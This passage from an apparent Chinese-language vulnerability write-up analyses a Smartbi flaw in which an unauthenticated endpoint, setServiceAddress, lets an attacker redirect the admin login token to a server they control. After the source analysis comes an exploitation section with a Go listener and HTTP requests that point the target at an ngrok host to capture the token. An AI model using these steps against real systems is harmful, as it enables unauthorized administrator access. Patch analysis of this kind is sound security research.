class="string">&quot;service&quot;</span>.equals(type)) &#123;</span><br><span class="line">        EngineApi.postJsonService(ServiceUrl.SERVICE_TOKEN.name(), result, Map.class, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;EngineApi.address(<span class="string">&quot;service-address&quot;</span>)&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>它们接收的第一个参数值分别如下，差不多类似，取决于占位符。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENGINE_TOKEN(<span class="string">&quot;&#123;0&#125;/api/v1/configs/engine/smartbitoken&quot;</span>)</span><br><span class="line">SERVICE_TOKEN(<span class="string">&quot;%s/api/v1/configs/engine/smartbitoken&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>postJsonService</code>还会多传递了一个<code>EngineApi.address(&quot;service-address&quot;)</code>对象，<code>EngineApi.address</code>方法如下，当接收的值为<code>&quot;service-address&quot;</code>时会返回<code>&quot;SERVICE_ADDRESS&quot;</code>的值，该值最终会被传递到<code>postJsonService</code>方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">address</span><span class="params">(String type)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (type.equals(<span class="string">&quot;engine-address&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> SystemConfigService.getInstance().getValue(<span class="string">&quot;ENGINE_ADDRESS&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equals(<span class="string">&quot;service-address&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> SystemConfigService.getInstance().getValue(<span class="string">&quot;SERVICE_ADDRESS&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type.equals(<span class="string">&quot;outside-schedule&quot;</span>) ? SystemConfigService.getInstance().getValue(<span class="string">&quot;MINING_OUTSIDE_SCHEDULE&quot;</span>) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别查看<code>postJsonEngine</code>和<code>postJsonService</code>方法。在<code>postJsonEngine</code>方法中，<code>values</code>值为空，而在<code>postJsonService</code>方法中，<code>values</code>值为<code>&quot;SERVICE_ADDRESS&quot;</code>的值。还存在的差异就是<code>EngineUrl.getUrl</code>与<code>ServiceUrl.getUrl</code>方法的不同。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">postJsonEngine</span><span class="params">(String type, Object data, Class&lt;T&gt; dataType, Object... values)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> EngineUrl.getUrl(type, values);</span><br><span class="line">    <span class="keyword">return</span> HttpKit.postJson(url, data, dataType);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">postJsonService</span><span class="params">(String type, Object data, Class&lt;T&gt; dataType, Object... values)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> ServiceUrl.getUrl(type, values);</span><br><span class="line">    <span class="keyword">return</span> HttpsKit.postJson(url, data, dataType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在最后，它们都会向<code>getUrl</code>方法返回的<code>url</code>提交POST请求，body为JSON类型来发送<code>token</code>值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> HttpsKit.postJson(url, data, dataType);</span><br></pre></td></tr></table></figure><p>先进入到<code>EngineUrl.getUrl</code>方法中，虽然传入其中的<code>values</code>值将会为空，但在最后会将<code>EngineApi.address(&quot;engine-address&quot;)</code>作为<code>&quot;&#123;0&#125;/api/v1/configs/engine/smartbitoken&quot;</code>的占位符，根据如上的<code>address</code>方法能够知道该值为<code>&quot;ENGINE_ADDRESS&quot;</code>的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getUrl</span><span class="params">(String val, Object... values)</span> &#123;</span><br><span class="line">    <span class="type">EngineUrl</span> <span class="variable">engineUrl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    engineUrl = valueOf(val);</span><br><span class="line">    <span class="keyword">if</span> (engineUrl != <span class="literal">null</span> &amp;&amp; engineUrl.url != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> engineUrl.url;</span><br><span class="line">        url = String.format(url, values);</span><br><span class="line">        <span class="keyword">if</span> (url.contains(<span class="string">&quot;lang=&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">Locale</span> <span class="variable">currentLocale</span> <span class="operator">=</span> LanguageHelper.getCurrentLocale();</span><br><span class="line">            <span class="type">String</span> <span class="variable">language</span> <span class="operator">=</span> currentLocale.toString();</span><br><span class="line">            url = MessageFormat.format(url, EngineApi.address(<span class="string">&quot;engine-address&quot;</span>), language);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            url = MessageFormat.format(url, EngineApi.address(<span class="string">&quot;engine-address&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的，进入<code>ServiceUrl.getUrl</code>方法，在其中，<code>values</code>也就是传进来的<code>&quot;SERVICE_ADDRESS&quot;</code>值会作为占位符，与<code>&quot;%s/api/v1/configs/engine/smartbitoken&quot;</code>进行拼接。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getUrl</span><span class="params">(String val, Object... values)</span> &#123;</span><br><span class="line">    <span class="type">ServiceUrl</span> <span class="variable">serviceUrl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    serviceUrl = valueOf(val);</span><br><span class="line">    <span class="keyword">if</span> (serviceUrl != <span class="literal">null</span> &amp;&amp; serviceUrl.url != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> serviceUrl.url;</span><br><span class="line">        url = String.format(url, values);</span><br><span class="line">        <span class="keyword">if</span> (url.contains(<span class="string">&quot;lang=&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">Locale</span> <span class="variable">currentLocale</span> <span class="operator">=</span> LanguageHelper.getCurrentLocale();</span><br><span class="line">            <span class="type">String</span> <span class="variable">language</span> <span class="operator">=</span> currentLocale.toString();</span><br><span class="line">            url = MessageFormat.format(url, language);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个<code>getUrl</code>方法返回的<code>url</code>差不多类似，意味着在<code>MonitorService.getToken</code>方法中，<code>type</code>值为<code>&quot;experiment&quot;</code>或<code>&quot;service&quot;</code>，都是差不多的，区别只在于<code>&quot;ENGINE_ADDRESS&quot;</code>与<code>&quot;SERVICE_ADDRESS&quot;</code>。</p><h3 id="设置地址"><a href="#设置地址" class="headerlink" title="设置地址"></a>设置地址</h3><p>如上分析，可以发现关键就在于<code>&quot;ENGINE_ADDRESS&quot;</code>或<code>&quot;SERVICE_ADDRESS&quot;</code>的值，需要是可控的。在补丁分析阶段，补丁日志更新文件中那些会被禁用的<code>url</code>，有<code>engine</code>、<code>service</code>、<code>addressd</code>的字眼。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;PATCH_20230728&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;desc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;修复在某种特定情况下破解用户密码和特定情况下DB2绕过判断执行命令漏洞 (Patch.20230728  @2023-07-28)&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;urls&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/smartbix/api/monitor/setServiceAddress&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RejectSmartbixSetAddress&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/smartbix/api/monitor/setEngineAddress&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RejectSmartbixSetAddress&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>挑其中之一进行分析，如<code>/smartbix/api/monitor/setServiceAddress</code>。根据<code>MonitorService</code>类中的<code>@RequestMapping</code>注解，该接口的处理方法如下，在其中恰恰就可以更新<code>&quot;SERVICE_ADDRESS&quot;</code>的值，将该值更改为攻击者自己可控的服务器地址，便可以接收到管理员token，从而实现未授权后台登录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/setServiceAddress&quot;&#125;,</span></span><br><span class="line"><span class="meta">    method = &#123;RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> ResponseModel <span class="title function_">setServiceAddress</span><span class="params">(<span class="meta">@RequestBody</span> String serviceAddress)</span> &#123;</span><br><span class="line">    <span class="type">ResponseModel</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResponseModel</span>();</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isBlank(serviceAddress)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> SmartbiXException.create(CommonErrorCode.ILLEGAL_PARAMETER_VALUES).setDetail(<span class="string">&quot;Service address cannot be empty&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.systemConfigService.updateSystemConfig(<span class="string">&quot;SERVICE_ADDRESS&quot;</span>, serviceAddress, NodeLanguage.getNodeLanguage(<span class="string">&quot;ServiceAddress&quot;</span>));</span><br><span class="line">        res.setMessage(<span class="string">&quot;Service address updated successfully&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.setTime();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补丁日志更新文件中其他被禁用的<code>url</code>就不一一分析了，差别只在于请求路径有所不同。</p><h3 id="token利用"><a href="#token利用" class="headerlink" title="token利用"></a>token利用</h3><p><code>MonitorService</code>类中的<code>loginByToken</code>方法，会调用<code>catalogService.loginByToken</code>方法对传入的<code>token</code>进行判断。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/login&quot;&#125;,</span></span><br><span class="line"><span class="meta">    method = &#123;RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="meta">@FunctionPermission(&#123;&quot;NOT_LOGIN_REQUIRED&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">loginByToken</span><span class="params">(<span class="meta">@RequestBody</span> String token)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isLogin</span> <span class="operator">=</span> <span class="built_in">this</span>.catalogService.loginByToken(token);</span><br><span class="line">    ComponentStateHolder.toSmartbiX();</span><br><span class="line">    Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    result.put(<span class="string">&quot;result&quot;</span>, isLogin);</span><br><span class="line">    ComponentStateHolder.fromSmartbiX();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>catalogService.loginByToken</code>方法中，它又调用了<code>userManagerModule.loginByToken</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loginByToken</span><span class="params">(String token)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtil.isNullOrEmpty(token)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">userName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">UserLoginToken</span> <span class="variable">loginToken</span> <span class="operator">=</span> (UserLoginToken)LoginTokenDAO.getInstance().load(token);</span><br><span class="line">        <span class="keyword">if</span> (loginToken != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (loginToken.getCreateTime() != <span class="literal">null</span> &amp;&amp; System.currentTimeMillis() - loginToken.getCreateTime().getTime() &lt;= loginToken.getDuration()) &#123;</span><br><span class="line">                userName = loginToken.getUserName();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.deleteLoginToken(loginToken);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (StringUtil.isNullOrEmpty(userName)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">IUser</span> <span class="variable">user</span> <span class="operator">=</span> <span class="built_in">this</span>.getCurrentUser();</span><br><span class="line">            <span class="keyword">if</span> (user == <span class="literal">null</span> || !<span class="built_in">this</span>.isAdmin(user.getId())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.stateModule.getSystemId() == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.stateModule.setSystemId(<span class="string">&quot;DEFAULT_SYS&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.stateModule.setCurrentUser(<span class="built_in">this</span>.getUserById(<span class="string">&quot;SERVICE&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (loginToken != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.stateModule.getSession() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">ext</span> <span class="operator">=</span> loginToken.getExtended();</span><br><span class="line">                <span class="type">JSONObject</span> <span class="variable">extended</span> <span class="operator">=</span> StringUtil.isNullOrEmpty(ext) ? <span class="keyword">new</span> <span class="title class_">JSONObject</span>() : JSONObject.fromString(ext);</span><br><span class="line">                extended.put(<span class="string">&quot;sessionId&quot;</span>, <span class="built_in">this</span>.stateModule.getSession().getId());</span><br><span class="line">                loginToken.setExtended(extended.toString());</span><br><span class="line">                LoginTokenDAO.getInstance().update(loginToken);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.switchUser(userName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法用于通过<code>token</code>进行登录，它会根据传入的<code>token</code>从数据库中加载用户登录信息，判断<code>token</code>是否有效，并根据登录信息中的用户名来执行登录操作。同时，在登录过程中，会将会话ID加入到登录信息的扩展字段中，以便进行后续的会话管理。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>首先在自己服务器上起一个HTTP服务，当然也可以起在本地，利用某些内网穿透服务对外暴露本地HTTP服务来达到同样的效果。该HTTP服务将接收任意请求，均返回200状态码和JSON内容类型。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, handleRequest)</span><br><span class="line">fmt.Println(<span class="string">&quot;Server is running on *:8088&quot;</span>)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8088&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleRequest</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">printHTTPRequest(r)</span><br><span class="line">w.WriteHeader(http.StatusOK)</span><br><span class="line">w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">response := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello, this is a response in JSON!&quot;</span>&#125;</span><br><span class="line">jsonResponse, _ := json.Marshal(response)</span><br><span class="line">w.Write(jsonResponse)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printHTTPRequest</span><span class="params">(r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;--- Received HTTP Request ---&quot;</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s %s %s\n&quot;</span>, r.Method, r.URL.String(), r.Proto)</span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> r.Header &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s: %s\n&quot;</span>, key, value)</span><br><span class="line">&#125;</span><br><span class="line">body, _ := io.ReadAll(r.Body)</span><br><span class="line">fmt.Printf(<span class="string">&quot;\n%s\n&quot;</span>, body)</span><br><span class="line">fmt.Println(<span class="string">&quot;---------------------------&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向目标站点发送<code>&quot;SERVICE_ADDRESS&quot;</code>，注意<code>Content-Type</code>标头。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/smartbix/api/monitor/setServiceAddress</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>40</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">https</span>://hz29-<span class="number">03</span>-<span class="number">542</span>-<span class="number">6</span>-<span class="number">825</span>.ngrok-free.app</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 02 Aug 2023 02:48:27 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>85</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be868e412d09; Path=/smartbi; HttpOnly</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=9DAB60CE0FFEDC6475B6F1837BA6C3D5; Path=/smartbi; HttpOnly</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;took&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;success&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;Service address updated successfully&quot;</span><span class="punctuation">,</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>请求<code>/engineInfo</code>，可以查看刚刚设置的<code>serviceAddress</code>。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/smartbix/api/monitor/engineInfo</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 02 Aug 2023 02:58:37 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>224</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be88dda52d11; Path=/smartbi; HttpOnly</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=CD64F807282B28163038F08D5783DFE9; Path=/smartbi; HttpOnly</span><br><span class="line"></span><br><span class="line"><span class="language-wren">&#123;<span class="string">&quot;took&quot;</span>:<span class="number">0</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Operation successful&quot;</span>,<span class="string">&quot;code&quot;</span>:<span class="number">200</span>,<span class="string">&quot;entity&quot;</span>:&#123;<span class="string">&quot;serviceAddress&quot;</span>:<span class="string">&quot;https://hz29-03-542-6-825.ngrok-free.app&quot;</span>,<span class="string">&quot;engineAddress&quot;</span>:<span class="string">&quot;className=UserService<span class="char escape_">\u0026</span>methodName=isLogged<span class="char escape_">\u0026</span>params=%5B%5D&quot;</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>接着，触发目标站点向我们可控的服务器发送token。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/smartbix/api/monitor/token</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: 